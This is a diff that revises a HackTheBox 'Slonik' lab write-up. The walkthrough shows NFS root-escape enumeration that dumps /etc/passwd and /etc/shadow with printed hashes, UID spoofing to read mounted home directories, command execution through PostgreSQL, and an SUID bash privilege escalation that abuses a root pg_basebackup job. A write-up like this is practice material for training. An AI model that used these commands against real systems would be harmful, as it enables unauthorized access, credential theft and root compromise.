@@ -9,7 +9,10 @@ tags:
   - HTB
   - Linux
   - medium
-lastmod: 2026-04-03T07:36:07.086Z
+  - nmap
+  - nfs-to-rce
+  - Linux-Privilege-Escalation-Directory-Ownership-Error
+lastmod: 2026-04-04T03:58:49.092Z
 ---
 # Box Info
 
@@ -19,9 +22,13 @@ lastmod: 2026-04-03T07:36:07.086Z
 
 # Recon
 
-### \[\[PORT & IP SCAN]]
+### PORT & IP SCAN
 
-The `nmap` reveal that the machine is Linux server
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "nmap" >}} start of nmap to show the nfs share result
+
+{{< /toggle >}}
 
 ```
 ➜  htb sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 10.129.234.160  -oN serviceScan.txt
@@ -81,7 +88,7 @@ Nmap done: 1 IP address (1 host up) scanned in 9.88 seconds
 
 ```
 
-The result shows the `nfs` 's  standard setup
+# Shell as postgres
 
 ### TCP 2049 nfs\_acl
 
@@ -107,6 +114,34 @@ mount.nfs: an incorrect mount option was specified for /mnt/Slonik
 ```
 
 Failed to use the mount to find the data , so use another tool may be helpful , like using the netexec
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "nfs-to-rce" >}} Enuming the NFS setting by netexec 's nfs setting and mounting into local linux to discover bash history that they connect the bash history  , owning the user password from downloading the /etc/passwd and /etc/shadow by join in nfs root escape and create the same local user to access the mount files, so create the tunnel for postgres in 5432 to connect , after inject the ssh key to RCE to target
+
+{{< /toggle >}}
+
+{{< mindmap >}}
+
+# nfs root escape
+
+* /etc/passwd
+* /etc/shadow
+  * create user
+    * access mount file
+
+# NFS
+
+* mount
+  * bash history
+    * bash history
+
+# create the tunnel
+
+* postgres
+  * RCE
+
+{{< /mindmap >}}
 
 The [Netexe](https://www.netexec.wiki/nfs-protocol/enumeration) also has the reference for it , I will follow it
 
@@ -177,7 +212,7 @@ NFS         10.129.234.160  42445  10.129.234.160   [-] Error writing to '/home/
 
 ```
 
-Not work
+It is failed
 
 Noted the `nxc` show [root escape](https://www.netexec.wiki/nfs-protocol/escape-to-root-file-system) to get the `/etc/exports` for knowing the setting , so you can mount it on your local Linux with setting your local `/etc/passwd` to check the history file step by step .
 
@@ -237,7 +272,7 @@ NFS         10.129.234.160  42445  10.129.234.160   0          dr--   4.0KB     
 
 ### /etc/passwd , /etc/shadow
 
-The [idea](attack.mitre.org/techniques/T1003/008/) in here is to download the `/etc/passwd` and /etc/shadow/ for knowing who is on the server .
+The [idea](https://attack.mitre.org/techniques/T1003/008/) in here is to download the `/etc/passwd` and `/etc/shadow/` for knowing who is on the server .
 
 ```
 ┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
@@ -269,7 +304,7 @@ Now abuse the passwd and the shadow , and the \$ represent to the real password 
 ```
 ┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
 └─$ cat shadow | grep '\$' > shadow.hashes 
-                                                                                                                                                                                                        
+                                                                                                                                                                                    
 ┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
 └─$ cat shadow.hashes 
 root:$y$j9T$nHJOa2A9rTXPQi3rqjrDI/$mbo9VYMotfEvj4Va5D7Lv0AOzdHRuMwGf.4nue0pZe3:19654:0:99999:7:::
@@ -348,11 +383,9 @@ Warning: Permanently added '10.129.234.160' (ED25519) to the list of known hosts
 (service@10.129.234.160) Password:
 ```
 
-SSH not work
+SSH is failed
 
 ### /etc/exports
-
-back to nfs , i want to know how the `/etc/exports` setting
 
 ```
 ┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
@@ -389,7 +422,7 @@ NFS         10.129.234.160  42445  10.129.234.160   ---        -----  --------- 
 NFS         10.129.234.160  42445  10.129.234.160   0          -r--   126.0B        /etc/exports
 ```
 
-download it
+Check and download the nfs setting by inspecting `/etc/exports`  to know that which enable to mount to home amd the /var/backups
 
 ```
 ┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
@@ -409,8 +442,6 @@ NFS         10.129.234.160  42445  10.129.234.160   File successfully downloaded
 /home                  \*(ro,root\_squash,sync,no\_subtree\_check)\
 /var/backups           \*(ro,root\_squash,sync,no\_subtree\_check)\
 {{< /code >}}
-
-mean i can mount the home amd the /var/backups
 
 ```
 
@@ -452,9 +483,11 @@ su: user service does not exist or the user entry does not contain all the requi
 
 ```
 
-### Mount
+Complaining our local linux `/etc/password` dont have the user with the uid  , so appearing the `permission denied`
 
-but i can create the service , and do the service user
+### Create user
+
+copy target machine 's passwd to our passwd
 
 ```
 ┌──(parallels㉿kali-linux-2025-2)-[/mnt/home]
@@ -471,7 +504,7 @@ server 's UID is 1337
 ```
 ──(parallels㉿kali-linux-2025-2)-[/mnt/home]
 └─$ sudo useradd -u 1337 -m -s /bin/bash service
-                                                                                                                                                                                                                                          
+                                                                                                                                                                                                          
 ┌──(parallels㉿kali-linux-2025-2)-[/mnt/home]
 └─$ sudo passwd service
 New password: 
@@ -534,6 +567,8 @@ psql -U postgres
 exit
 ```
 
+The `.bash_history` result show us that they used `psql` to login the database , but we cant directly connect the database , and ssh directly connect is failed , so try to make the tunnel of UNIX socket only for connet the 5432.
+
 ### Create Tunnel to PostgreSQL
 
 What is UNIX socket?
@@ -590,6 +625,8 @@ Type "help" for help.
 postgres=# 
 ```
 
+### Enum postgres
+
 ```
 postgres=# \list
                                                    List of databases
@@ -604,6 +641,8 @@ postgres=# \list
 (4 rows)
 
 ```
+
+### postgres RCE
 
 To execute commands via PostgreSQL, I’ll create a table to store output, copy results into it, and get them:
 
@@ -645,7 +684,7 @@ COPY 1
 postgres=# 
 ```
 
-Now will be ok
+Try to login it
 
 ```
 ┌──(parallels㉿kali-linux-2025-2)-[~/.ssh]
@@ -730,6 +769,32 @@ postgres@slonik:~$ cat user.txt
 postgres@slonik:~$ 
 ```
 
+# Shell as Root
+
+### pspy64
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Linux-Privilege-Escalation-Directory-Ownership-Error" >}} Enuming the process by pspy with grep "CMD:" , discovering  /bin/bash /usr/bin/backup which is owned by root to run pg basebackup function with backup the file to  /opt/backups/current/ ,and /var/backups/archive date.zip will zip the the directory which is my owned , so i can copy the /bin/bash to my directory , them the cron will help us backup back to /opt/backups/current/, and get the root with bash -p
+
+{{< /toggle >}}
+
+{{< mindmap >}}
+
+# PSPY64
+
+* /bin/bash /usr/bin/backup
+
+# /usr/bin/backup
+
+* pg\_basebackup
+  * copy /var/backups/archive-\$date.zip to  /opt/backups/current/
+* copy the /bin/bash to zip target
+  * bash -p
+    * root
+
+{{< /mindmap >}}
+
 ```
 ──(parallels㉿kali-linux-2025-2)-[~/Desktop]
 └─$ scp -i ~/keys/ed25519_gen ./pspy64 postgres@10.129.234.160:/dev/shm/
@@ -762,6 +827,8 @@ Warning: Identity file /home/parallels/keys/ed25519_gen not accessible: No such 
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
 pspy64                                                                           100% 3032KB   1.3MB/s   00:02  
 ```
+
+upload and run the pspy64 , i use the grep  `| grep "CMD:"` to avoid too much information in here
 
 ```
 postgres@slonik:/dev/shm$ chmod +x pspy64
@@ -1060,13 +1127,19 @@ postgres@slonik:/dev/shm\$ timeout  120 ./pspy64  -pfd -i 1000 | grep "CMD:"\
 2026/04/03 07:19:11 CMD: UID=0     PID=11139  | /usr/bin/snap run amazon-ssm-agent\
 {{< /code >}}
 
-`/usr/bin/backup`
+### source code review
+
+`/usr/bin/backup` is created by `/bin/bash`
+
+what is `/usr/bin/backup` ?
 
 ```
 postgres@slonik:/dev/shm$ ls -al /usr/bin/backup
 -rwxr-xr-x 1 root root 392 Oct 24  2023 /usr/bin/backup
 postgres@slonik:/dev/shm$ 
 ```
+
+owner by root ,The core of this vulnerability lies in a violation of the **Principle of Least Privilege**: running a database backup utility as `root`.
 
 {{< code >}}\
 \#!/bin/bash
@@ -1086,7 +1159,7 @@ fi\
 /usr/bin/pg_basebackup
 ```
 
-https://docs.postgresql.tw/reference/client-applications/pg\_basebackup
+**The Exploit:** `pg_basebackup` faithfully streams the contents of the database directory and recreates them in the backup destination. Because the script is executing as `root`, the newly created files in `/opt/backups/current/` are given `root` ownership. Crucially, `pg_basebackup` **preserves the file permissions** from the source stream.
 
 ```
 postgres@slonik:~/14/main$ ls
@@ -1109,12 +1182,27 @@ postgres@slonik:~/14/main$
 ```
 
 ```
+postgres@slonik:~/14/$ cp /bin/bash ./main/bash
+postgres@slonik:~/14/$ chmod 6777 ~/14/main/bash
+```
+
+**State:** The file permissions look like `-rwsrwsrwx`. The `s` means that whoever runs this file will run it with the permissions of the *file's owner*. However, because the owner is currently still `postgres`, running it right now wouldn't elevate the attacker's privileges.
+
+```
 postgres@slonik:~/14/main$ ls -al /opt/backups/current/bash 
 -rwsrwsrwx 1 root root 1396520 Apr  3 07:34 /opt/backups/current/bash
 ```
+
+The script executes the command: `/usr/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/`
+
+**Action:** The `pg_basebackup` utility connects to the database and begins streaming a complete copy of the `~/14/main/` directory to the backup destination (`/opt/backups/current/`).
+
+**The Flaw:** `pg_basebackup` is designed to exactly mirror the database directory, which means it **preserves file permissions** from the source files.
 
 ```
 postgres@slonik:~/14/main$ /opt/backups/current/bash -p
 bash-5.1# whoami 
 root
 ```
+
+**Why `-p`?** By default, modern bash will detect if it is running with an SUID bit and will automatically drop those privileges to prevent accidental escalation. The `-p` flag explicitly tells bash *not* to drop them.
